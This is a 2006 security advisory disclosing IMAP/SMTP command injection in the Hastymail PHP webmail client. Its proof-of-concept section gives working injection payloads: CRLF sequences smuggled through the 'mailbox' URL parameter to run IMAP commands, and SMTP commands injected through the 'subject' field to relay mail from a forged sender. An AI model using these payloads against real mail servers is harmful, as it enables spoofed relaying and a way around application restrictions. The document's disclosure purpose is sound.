INTERNET SECURITY AUDITORS ALERT 2006-011
- Original release date: September 28, 2006
- Last revised: December 1, 2006
- Discovered by: Vicente Aguilera Diaz
- Severity: 3/5
=============================================

I. VULNERABILITY
-------------------------
IMAP/SMTP Injection in Hastymail.

II. BACKGROUND
-------------------------
Hastymail is yet another webmail IMAP client written in PHP. Hastymail
is designed for speed, RFC compatibility, simplicity, and security.
Our goal is to create a simple interface with powerful but easy to use
options that make managing your IMAP account effective and fast.

Hastymail is NOT groupware. We are focused on being a functional and
fast webmail client.

The product homepage is http://hastymail.sourceforge.net/

III. DESCRIPTION
-------------------------
Hastymail provides a graphical interface to interact with mail servers
across the IMAP/SMTP protocols.

Improper command and information validation transmitted by Hastymail
to the mail servers during the normal use of this application (for
example, acceding to the mailbox) facilitates that an authenticate
malicious user could inject arbitrary IMAP/SMTP commands into the mail
servers used by Hastymail across parameters used by the webmail
front-end in its communication with these mail servers.

This is become dangerous because the injection of these commands
allows an intruder to evade restrictions imposed at application level,
and exploit vulnerabilities that could exist in the mail servers
through IMAP/SMTP commands.

IV. PROOF OF CONCEPT
-------------------------
== IMAP Injection example (1.5 version) =============
Hastymail Vulnerable parameter: "mailbox" (and possibly others)

When a user access to a folder (for example, "INBOX"), he creates a
GET request as:
http://<webserver>/<path_to_hastymail>/html/mailbox.php?id=47fc54216aae12d57570c9703abe1b7d&mailbox=INBOX

A malicious user can modify the value of the "mailbox" parameter and
inject any IMAP command.
The IMAP command injection has the following structure:
http://<webserver>/<path_to_hastymail>/html/mailbox.php?id=47fc54216aae12d57570c9703abe1b7d&mailbox=INBOX%2522%0d%0a<ID>%20<INJECT_IMAP_COMMAND_HERE>%0D%0A<ID>%20SELECT%20%2522INBOX
To observe that there has been in use double URL encoding for
codifying the quote character (").

Example:
Injection of the CREATE IMAP command across the "mailbox" parameter:
http://<webserver>/<path_to_hastymail>/html/mailbox.php?id=47fc54216aae12d57570c9703abe1b7d&mailbox=INBOX%2522%0d%0aA0003%20CREATE
%2522INBOX.vad

== SMTP Injection example (1.5 version) =============
Hastymail Vulnerable parameter: "subject" (and possibly others)

When a user send a message, he create a POST request like:
POST http://<webserver>/<path_to_hastymail>/html/compose.php HTTP/1.1

Content-Disposition: form-data; name="subject"

Proof of Concept
-----------------------------84060780712450133071594948441
...

A malicious user can modify the value of the "subject" parameter and
inject any SMTP command.
Example: Relay from a non-existent e-mail address

Content-Disposition: form-data; name="subject"

Proof of Concept
.
mail from: hacker@domain.com
rcpt to: victim@otherdomain.com
data
This is a proof of concept of the SMTP command injection in Hastymail
.

the IMAP/SMTP servers and evade all the restrictions at the
application layer.
